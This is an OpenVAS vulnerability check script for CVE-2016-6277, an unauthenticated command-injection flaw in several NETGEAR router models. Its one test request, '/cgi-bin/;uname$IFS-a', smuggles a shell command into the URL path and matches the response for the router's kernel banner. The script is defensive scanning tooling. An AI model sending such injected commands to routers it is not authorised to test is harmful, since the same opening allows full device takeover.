###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netgear_routers_rce_vuln.nasl 11772 2018-10-08 07:20:02Z asteins $
#
# NETGEAR Routers RCE Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106463");
  script_version("$Revision: 11772 $");
  script_cve_id("CVE-2016-6277");
  script_tag(name:"last_modification", value:"$Date: 2018-10-08 09:20:02 +0200 (Mon, 08 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-12-12 11:02:51 +0700 (Mon, 12 Dec 2016)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("NETGEAR Routers RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_netgear_nighthawk_router_detect.nasl");
  script_require_ports("Services/www", 8443);
  script_mandatory_keys("netgear_nighthawk/detected");

  script_tag(name:"summary", value:"Multiple Netgear routers are prone to a remote command execution
vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to execute an os command and checks the response.");

  script_tag(name:"impact", value:"An unauthenticated user can inject os commands.");

  script_tag(name:"affected", value:"Netgear Model R6250, R6400, R6700, R6900, R7000, R7100LG, R7300DST, R7900,
R8000, D6220 and D6400.");

  script_tag(name:"solution", value:"Update to the latest firmware according the vendor's advisory.");

  script_xref(name:"URL", value:"https://www.kb.cert.org/vuls/id/582384");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40889/");
  script_xref(name:"URL", value:"http://www.sj-vs.net/a-temporary-fix-for-cert-vu582384-cwe-77-on-netgear-r7000-and-r6400-routers/");
  script_xref(name:"URL", value:"http://kb.netgear.com/000036386/CVE-2016-582384");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default: 8443);

url = "/cgi-bin/;uname$IFS-a";

if (http_vuln_check(port: port, url: url, pattern: "Linux .* SMP PREEMPT.*armv7l unknown")) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
